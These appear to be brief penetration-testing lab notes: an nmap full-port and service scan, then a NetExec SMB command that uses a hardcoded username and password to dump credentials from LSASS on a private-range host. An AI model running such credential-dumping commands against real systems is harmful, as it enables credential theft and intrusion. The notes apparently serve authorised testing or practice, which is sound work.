# NMAP

```bash
nmap -p- -Pn -iL ../ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn -iL ../ips -sVC -v -oN nmap_sCV.txt
```

# Extract

```bash
nxc smb 192.168.120.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
